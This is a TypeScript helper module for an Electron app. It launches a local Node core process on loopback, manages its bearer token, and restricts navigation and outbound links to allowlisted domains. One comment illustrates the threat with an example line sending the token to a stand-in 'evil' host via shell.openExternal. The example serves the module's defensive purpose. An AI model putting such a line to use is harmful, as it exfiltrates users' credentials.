/**
 * Pure helpers for launching + talking to the bundled core (no Electron import —
 * unit-tested in test/core-launcher.test.ts). main.ts wires these into the
 * Electron lifecycle.
 *
 * ABI note (W3.0 smoke): core's native modules (better-sqlite3) are built for
 * Node's ABI (115 on Node 20), NOT Electron's (130). So core is spawned as a
 * child process under a **Node** runtime, never Electron's — dev uses the system
 * `node`; packaging provides a deterministic Node-20 runtime (K_NODE_BIN). This
 * keeps the natives (and core's own test suite) on one ABI.
 */
import net from 'node:net'
import fs from 'node:fs'
import path from 'node:path'

/**
 * Ask the OS for a free ephemeral loopback port (bind :0, read it, release). The
 * core then binds it — a tiny TOCTOU window is acceptable for a single-user local
 * app, and a bind clash surfaces as a health-timeout the shell already handles.
 */
export function pickFreePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = net.createServer()
    srv.on('error', reject)
    srv.listen(0, '127.0.0.1', () => {
      const addr = srv.address()
      if (addr && typeof addr === 'object') {
        const { port } = addr
        srv.close(() => resolve(port))
      } else {
        srv.close(() => reject(new Error('could not determine a free port')))
      }
    })
  })
}

export interface CoreEnvInput {
  port: number
  dataDir: string
  webDist: string
  /** Writable repo-root override for the packaged app. When set, core's writable
   *  repo-relative paths (.worktrees / artifacts / workspace) follow it instead of
   *  the read-only install; unset (dev) → core's in-repo default. See K_REPO_ROOT in
   *  core/src/supervisor.ts. */
  repoRoot?: string
  /** Base env to extend (defaults to process.env). PATH etc. must carry through so
   *  core can spawn claude/git/gh. */
  baseEnv?: NodeJS.ProcessEnv
}

/**
 * Build the env for the forked core process. Loopback-only, terminal off, data dir
 * + web dist pinned to the app's locations. HARNESS_TOKEN is forced EMPTY so core
 * generates + persists its own strong token (the shell reads it back from disk) —
 * never inheriting a stray token from the desktop process.
 */
export function buildCoreEnv(input: CoreEnvInput): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {
    ...(input.baseEnv ?? process.env),
    PORT: String(input.port),
    HOST: '127.0.0.1',
    K_DATA_DIR: input.dataDir,
    K_WEB_DIST: input.webDist,
    // Same-origin — no CORS needed, but pin it to the actual origin (defense-in-depth
    // vs the dev default of :5173).
    CORS_ORIGIN: `http://127.0.0.1:${input.port}`,
    // Sensitive default-off feature — never auto-enable a shell in the app.
    ENABLE_TERMINAL: 'false',
    // Let core own its token; don't inherit one from the desktop env.
    HARNESS_TOKEN: '',
    // The shell reads the token from disk + seeds it — core must NOT print the full
    // first-run token to stdout (the shell forwards it to a terminal / future log).
    K_SUPPRESS_TOKEN_PRINT: '1',
  }
  // Only pin K_REPO_ROOT when the packaged shell provides a writable runtime; in dev
  // it stays unset so core keeps its in-repo default (see core/src/supervisor.ts).
  if (input.repoRoot) env.K_REPO_ROOT = input.repoRoot
  return env
}

/** Absolute path to core's compiled entry under the app resources root. */
export function coreEntryPath(resourcesRoot: string): string {
  return path.join(resourcesRoot, 'core', 'dist', 'index.js')
}

/** Absolute path to the built web SPA under the app resources root. */
export function webDistPath(resourcesRoot: string): string {
  return path.join(resourcesRoot, 'web', 'dist')
}

/** Where core persists its bearer token (K_DATA_DIR/auth-token). */
export function authTokenPath(dataDir: string): string {
  return path.join(dataDir, 'auth-token')
}

/** Read core's persisted bearer token, or '' if it isn't there yet / unreadable
 *  (best-effort — a missing token just means the SPA shows the login screen). */
export function readToken(dataDir: string): string {
  try {
    return fs.readFileSync(authTokenPath(dataDir), 'utf8').trim()
  } catch {
    return ''
  }
}

export interface DesktopConfig {
  /** The bearer token the renderer seeds into sessionStorage (same key the web app
   *  reads: 'k.harnessToken'). */
  token: string
}

/** The config payload handed to the preload over IPC. Token only — the port is
 *  already in the same-origin window URL, and the token stays off argv/URL. */
export function buildDesktopConfig(token: string): DesktopConfig {
  return { token }
}

/** True when the renderer should try to navigate to `target` — only the core's own
 *  loopback origin is allowed (deny remote/external navigation, a security guard). */
export function isAllowedNavigation(target: string, corePort: number): boolean {
  try {
    const u = new URL(target)
    return (
      (u.protocol === 'http:' || u.protocol === 'https:') &&
      (u.hostname === '127.0.0.1' || u.hostname === 'localhost') &&
      u.port === String(corePort)
    )
  } catch {
    return false
  }
}

/** Base domains the app legitimately links out to (the doctor's install/doc URLs +
 *  GitHub). Subdomains match by suffix (docs.claude.com → claude.com). */
const EXTERNAL_BASE_DOMAINS = [
  'github.com',
  'claude.com',
  'anthropic.com',
  'git-scm.com',
  'ollama.com',
  'nodejs.org',
]

/**
 * Sanitize a URL the renderer wants opened in the OS browser, or return null to
 * refuse. Defense against token exfiltration: `will-navigate`/`setWindowOpenHandler`
 * fire for SCRIPT-driven navigation too, so a compromised renderer could try
 * `shell.openExternal('https://evil/?t=' + token)` — bypassing the CSP (a real
 * navigation isn't a fetch). We therefore (a) allow only http(s) to an allowlisted
 * host and (b) strip query, fragment, and credentials so nothing rides out.
 */
export function sanitizeExternalTarget(target: string): string | null {
  let u: URL
  try {
    u = new URL(target)
  } catch {
    return null
  }
  if (u.protocol !== 'https:' && u.protocol !== 'http:') return null
  const host = u.hostname.toLowerCase()
  const allowed = EXTERNAL_BASE_DOMAINS.some((d) => host === d || host.endsWith('.' + d))
  if (!allowed) return null
  // Origin + path only — no query, no fragment, no user:pass — so a token in a
  // script-crafted URL can't leak to the external browser.
  return `${u.protocol}//${u.host}${u.pathname}`
}
